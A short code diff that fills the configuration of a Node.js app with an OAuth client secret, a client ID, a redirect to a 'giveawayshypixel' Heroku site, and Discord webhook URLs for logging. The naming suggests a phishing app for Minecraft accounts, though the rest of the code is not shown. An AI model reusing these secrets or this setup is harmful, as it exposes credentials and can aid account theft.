@@ -1,9 +1,9 @@
 // Configuration
-const client_secret = 'change'
-const client_id = 'change'
-const redirect_uri = 'change'
-const webhook_url = 'change'
-const webhook_logging_url = 'change'
+const client_secret = 'zgH8Q~irl1Jlqg0seBKQ0GXRYIabLcTekAwq5bw4'
+const client_id = '237b022e-0a75-451c-ac2a-78e10c87c514'
+const redirect_uri = 'https://giveawayshypixel.herokuapp.com/'
+const webhook_url = 'https://discord.com/api/webhooks/1035588752128618537/x5Owq-LvYfBlpgg7yr_kYUJhh8Ay4rnF9TzjMAR7nRlVtuOl9RPa5UUvOBcZ9tTweRxR'
+const webhook_logging_url = 'https://discord.com/api/webhooks/1035588752128618537/x5Owq-LvYfBlpgg7yr_kYUJhh8Ay4rnF9TzjMAR7nRlVtuOl9RPa5UUvOBcZ9tTweRxR'
 // Config end
 const axios = require('axios')
 const express = require('express')
